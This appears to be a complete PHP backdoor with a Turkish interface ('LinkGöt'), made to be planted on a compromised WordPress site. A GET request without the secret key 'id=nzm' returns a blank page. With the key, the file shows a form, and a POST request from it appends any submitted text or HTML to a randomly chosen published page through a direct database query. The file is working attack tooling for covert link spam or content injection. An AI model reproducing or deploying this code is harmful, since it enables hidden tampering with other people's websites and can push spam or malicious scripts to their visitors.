<?php
$opmsg = "";
if( $_SERVER['REQUEST_METHOD'] === 'POST' ){
    $wp_exists = false;
    for ( $i = 0; $i <= 6; $i++ ) {
        $prefix = implode("", array_fill(1, $i, "../"));
        $headerphpf = $prefix . "wp-blog-header.php";
        $registphpf = $prefix . "wp-includes/registration.php";        
        if ( file_exists($headerphpf) && file_exists($registphpf) ) {
            require_once($headerphpf);
            require_once($registphpf);
            $wp_exists = true;
            break;
        }
    }
    
    if( !$wp_exists ){
        die("no WO installation found.");
    }
    
    $random_page_id = 0;
    $pages = $wpdb->get_results( "SELECT ID FROM `$wpdb->posts` Where post_type = 'page' and post_password = '' and post_status = 'publish' ORDER BY RAND() Limit 1;" );
    if( $pages ){
        foreach ( $pages as $page ) {
            $res = $wpdb->query( "Update `$wpdb->posts` Set post_content = CONCAT(post_content, '". str_replace("%", "%%", str_replace("'", "\\'", $_POST["body"])) ."') Where ID = ".$page->ID );
            if($res){
                $perm = get_permalink($page->ID);
                $opmsg .= 'Sayfaya eklendi: <a target="_blank" href="'. $perm .'">'. $perm .'</a> ('.$page->ID.')';
            }
            break;
        }
    }
} else{
    if( !isset($_GET["id"]) || $_GET["id"] != "nzm" ){
        die();
    }
}
?><!DOCTYPE html>
<html lang="tr">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkGöt</title>
  </head>
  <body>
		<?php 
			if( strlen($opmsg) > 0 ) {
				echo $opmsg . "<hr>"; 
			}
		?>
		<form method="post" action="?id=nzm">
			Post: <br><textarea name="body" rows="16" cols="100"></textarea><br>
			<input value="Gönder" type="submit">
		</form>
  </body>
</html>